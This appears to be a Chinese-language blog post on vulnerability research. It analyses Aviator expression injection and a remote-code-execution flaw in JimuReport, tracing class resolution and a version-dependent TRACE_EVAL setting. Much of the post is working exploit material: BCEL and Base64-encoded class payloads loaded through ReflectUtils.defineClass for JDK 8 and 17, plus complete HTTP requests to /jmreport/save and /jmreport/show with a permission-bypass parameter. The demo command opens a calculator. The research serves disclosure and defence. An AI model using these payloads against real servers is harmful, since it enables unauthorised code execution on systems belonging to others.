# 结合 Jimureport 的某个漏洞披露看 Aviator 表达式注入

## JDK 高版本的 Aviator 表达式注入

Aviator 表达式注入代码示例见 [JavaRce 项目](https://github.com/Whoopsunix/JavaRce/blob/main/SecVulns/VulnCore/Expression/AviatorAttack/src/main/java/com/ppp/aviator/AviatorDemo.java) ，在之前 aviatorscript 的[漏洞披露](https://github.com/killme2008/aviatorscript/issues/421)给出了了如下形式的 payload，利用 bcel 来加载字节码

```
'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"open -a Calculator.app\") );
```

提取出其中的 `Class.forName()` 调试一下代码

```java
AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
evaluator.execute("Class.forName('java.lang.String')");
```

通过 `com.googlecode.aviator.RuntimeFunctionDelegator#getFunc()` 动态调用 Aviator 中定义的方法

![image-20240807111409385](attachments/image-20240807111409385.png)

而换成全限定类名后，执行 `getFunc()` 方法会报错 `Function not found: java.lang.Class.forName`

```java
AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
evaluator.execute("java.lang.Class.forName('java.lang.String')");
```

调试到 `com.googlecode.aviator.utils.Env#resolveClassSymbol(java.lang.String, boolean)` 方法，这个方法主要是用于将类名解析为对应的 Java 类对象。

![image-20240807111809524](attachments/image-20240807111809524.png)

这里的话有两个值得看的地方：

1. 从这个代码的逻辑来看，如果包含 `.` 则直接调用 `classForName(name)` 方法来获取类对象，我们构造的是全限定类名，为什么传入的 name 是 `java`
2. 第二个条件逻辑，因为不存在类名时会假设该类隶属于 `java.lang` 包下，可以解释为什么直接用 `Class.forName()` 可以执行。



第一个问题定位到 `com.googlecode.aviator.runtime.type.AviatorJavaType#getProperty()` 方法，因为包含 `.` 所以被分割为数组，然后在 `com.googlecode.aviator.utils.Reflector#fastGetProperty()` 方法遍历逐个解析

![image-20240807112532434](attachments/image-20240807112532434.png)

![image-20240807112604647](attachments/image-20240807112604647.png)



`java.lang` 包下的类有限，所以还需要寻求突破。我们看到还有俩逻辑，用于引入包、类。这个解答第二个问题的疑问。

```java
// from imported packages
clazz = resolveFromImportedPackages(name);
if (clazz != null) {
  return checkIfClassIsAllowed(checkIfAllow, clazz);
}
// from imported classes
clazz = resolveFromImportedSymbols(name, clazz);
if (clazz != null) {
  return checkIfClassIsAllowed(checkIfAllow, clazz);
}
```

以包名为例，是读取的 `this.importedPackages` 对象，索性用的比较少，可以很轻易的跟到 `com.googlecode.aviator.runtime.function.internal.UseFunction#addSym()` 方法。

![image-20240807113101449](attachments/image-20240807113101449.png)

`*` 号给了很大的提示，然后就是翻官方文档了，找到引用 Java 类的语法 https://www.yuque.com/boyan-avfmj/aviatorscript/vk0ubs

```
use java.util.Date;

let d = new Date();

p(type(d));
p(d);
```

与通过 [JavaMethodReflectionFunctionMissing](https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#azo1K) 调用 Java 方法（基于反射）不同，使用 `use` 只能调用 [public static 方法](https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#rjNeD) ，对于 spring 框架可以用 `org.springframework.cglib.core.ReflectUtils` 来加载字节码，关于这个的利用可以看上一篇分析

> Link: [JDK 17+ FreeMarker SSTI：从 CVE-2023-4450 复现引出 MethodHandle 句柄、named module 机制研究](/docs/java/named%20module/)

![image-20240807113150049](attachments/image-20240807113150049.png)

所以最终按其语法可得

JDK 8 

```
use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('org.example.Exec', Base64Utils.decodeFromString('yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY'), ClassLoader.getSystemClassLoader());
```

JDK17 ，Aviator 中 null 为 nil

```
use org.springframework.cglib.core.*;use org.springframework.util.*;use java.security.*;ReflectUtils.defineClass('org.springframework.expression.Test', Base64Utils.decodeFromString('yv66vgAAADQALwoACgAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIHACMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdDsBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAALAAwHACQMACUAJgEAC3N0YXRpYyBFeGVjBwAnDAAoACkHACoMACsALAEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMAC0ALgEAE2phdmEvbGFuZy9FeGNlcHRpb24BACNvcmcvc3ByaW5nZnJhbWV3b3JrL2V4cHJlc3Npb24vVGVzdAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEACQAKAAAAAAACAAEACwAMAAEADQAAAC8AAQABAAAABSq3AAGxAAAAAgAOAAAABgABAAAABgAPAAAADAABAAAABQAQABEAAAAIABIADAABAA0AAABbAAIAAQAAABayAAISA7YABLgABRIGtgAHV6cABEuxAAEAAAARABQACAADAA4AAAAWAAUAAAAJAAgACgARAAwAFAALABUADQAPAAAAAgAAABMAAAAHAAJUBwAUAAABABUAAAACABY='), ClassLoader.getSystemClassLoader(), nil, Class.forName('org.springframework.expression.ExpressionParser'));
```

## Jimureport sink

漏洞位于 `/save` 和 `/show` 这两个接口，两个包间通过 `excel_config_id` 关联

函数名有点抽象就不慢慢截图了，两个接口对应函数

```
org.jeecg.modules.jmreport.desreport.service.a.e#saveReport()

org.jeecg.modules.jmreport.desreport.service.a.e#show()
```

在执行 `/show` 时，跟进到 `org.jeecg.modules.jmreport.desreport.express.a#c()` 函数，对于传入的格式有要求。声明了解析的字段为 text，并且内容得通过 `=()` 包含

![image-20240807121741077](attachments/image-20240807121741077.png)

至于 `/jeecg-boot/jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=` 则是用于 jeeboot 的权限绕过



payload:

```http
POST /jmreport/save HTTP/1.1
Host: localhost:8085
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Content-Type: application/json


{
    "loopBlockList": [],
    "area": false,
    "printElWidth": 718,
    "excel_config_id": "53c82a76f837d5661dceec7d93afep",
    "printElHeight": 1047,
    "rows": {
        "4": {
            "cells": {
                "4": {
                    "text": "=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('com.ppp.Exec', Base64Utils.decodeFromString('yv66vgAAADQANAoADAAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQIACUIACYHACcHACgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxjb20vcHBwL0V4ZWM7AQANU3RhY2tNYXBUYWJsZQcAJwcAJAEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEACUV4ZWMuamF2YQwADQAOBwApDAAqACsBAARFeGVjBwAsDAAtAC4HAC8MADAAMQEABGNhbGMMADIAMwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAtzdGF0aWMgRXhlYwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHABAAxjb20vcHBwL0V4ZWMBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAsADAAAAAAAAgABAA0ADgABAA8AAAB2AAIAAgAAABoqtwABsgACEgO2AAS4AAUSBrYAB1enAARMsQABAAQAFQAYAAgAAwAQAAAAGgAGAAAABwAEAAkADAAKABUADAAYAAsAGQANABEAAAAMAAEAAAAaABIAEwAAABQAAAAQAAL/ABgAAQcAFQABBwAWAAAIABcADgABAA8AAABbAAIAAQAAABayAAISCbYABLgABRIKtgAHV6cABEuxAAEAAAARABQACAADABAAAAAWAAUAAAARAAgAEgARABQAFAATABUAFQARAAAAAgAAABQAAAAHAAJUBwAWAAABABgAAAACABk='), ClassLoader.getSystemClassLoader());)",
                    "style": 0
                }
            },
            "height": 25
        },
        "len": 96,
        "-1": {
            "cells": {
                "-1": {
                    "text": "${gongsi.id}"
                }
            },
            "isDrag": true
        }
    },
    "dbexps": [],
    "toolPrintSizeObj": {
        "printType": "A4",
        "widthPx": 718,
        "heightPx": 1047
    },
    "dicts": [],
    "freeze": "A1",
    "dataRectWidth": 701,
    "background": false,
    "name": "sheet1",
    "autofilter": {},
    "styles": [
        {
            "align": "center"
        }
    ],
    "validations": [],
    "cols": {
        "4": {
            "width": 95
        },
        "len": 50
    },
    "merges": [
        "E4:F4",
        "B4:B5",
        "C4:C5",
        "D4:D5",
        "G4:G5",
        "H4:H5",
        "I4:I5",
        "D1:G1",
        "H3:I3"
    ]
}
```



```http
POST /jmreport/show HTTP/1.1
Host: localhost:8085
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MTQ2Mjk0NjEsInVzZXJuYW1lIjoiYWRtaW4ifQ.--r2FRXzk7Nu2_Zrbcdn_0sN3c0zKhKeei2yewFTLx0
Accept: application/json, text/plain, */*
Content-Type: application/json


{
    "id": "53c82a76f837d5661dceec7d93afep"
}


```



## jimureport 低版本为什么无法解析

用最新版的 1.7.8 可以复现，而用到 1.6.0 时发现调用的是 `com.googlecode.aviator.runtime.function.TraceFunction#call(java.util.Map<java.lang.String,java.lang.Object>, com.googlecode.aviator.runtime.type.AviatorObject, com.googlecode.aviator.runtime.type.AviatorObject)` 这个方法，并且在执行 `com.googlecode.aviator.runtime.function.TraceFunction#traceArgs()` 时报错。

![image-20240807143426654](attachments/image-20240807143426654.png)

回到 `com.googlecode.aviator.ClassExpression#executeDirectly()` 方法看看在调用 `com.googlecode.aviator.ClassExpression#execute0` 前发生了什么。

![image-20240807143843482](attachments/image-20240807143843482.png)

Avaitor 的底层也用的是 ASM 将表达式转换为可执行的字节码，这里没法步进调试无疑是上了一点难度。不过没关系，将依赖单独取出 payload 可用，直觉告诉我问题出在配置项，于是找了一下代码定位到 `com.googlecode.aviator.Options#TRACE_EVAL` 这个配置。关于 `TRACE_EVAL` 的 ASM 逻辑位于 `com.googlecode.aviator.code.asm.ASMCodeGenerator#onMethodName`

![image-20240807144306254](attachments/image-20240807144306254.png)

PS. 关于 ASM 的更多操作可以在 `com.googlecode.aviator.AviatorEvaluatorInstance#innerCompile()` 方法断点，之后可以跟到 `com.googlecode.aviator.code.OptimizeCodeGenerator#callASM()` 调用 ASM 的解析

### 验证猜想

先验证下猜想在 `com.googlecode.aviator.code.asm.ASMCodeGenerator#onMethodName()` 断点修改该配置 `this.instance.getOptionValue(Options.TRACE_EVAL).bool = false` 

![image-20240807152957990](attachments/image-20240807152957990.png)



除此之外在 `com.googlecode.aviator.runtime.type.AviatorJavaType#getValueFromEnv()` 解析 `Base64Utils.decodeFromString` 方法时，`RuntimeUtils.getInstance(env).getOptionValue(Options.ENABLE_PROPERTY_SYNTAX_SUGAR).bool` 为 flase ，不进入 `getProperty` 逻辑，也断点修改一下。

![image-20240807153209728](attachments/image-20240807153209728.png)

构造这俩条件，弹出计算器，验证猜想

1. TRACE_EVAL 为 false
2. ENABLE_PROPERTY_SYNTAX_SUGAR 为 true

![image-20240807153505210](attachments/image-20240807153505210.png)

### 哪里的变动？

然后就是看哪里加的这个配置？`com.googlecode.aviator.Options#isValidValue()` 对 `TRACE_EVAL` 赋值为 true

![image-20240807155037450](attachments/image-20240807155037450.png)

最终问题出在 `org.jeecg.modules.jmreport.desreport.express.ExpressUtil` 的 static 方法块中，低版本中将该值设为 true

![image-20240807155208199](attachments/image-20240807155208199.png)

高版本为 false

![image-20240807155331007](attachments/image-20240807155331007.png)



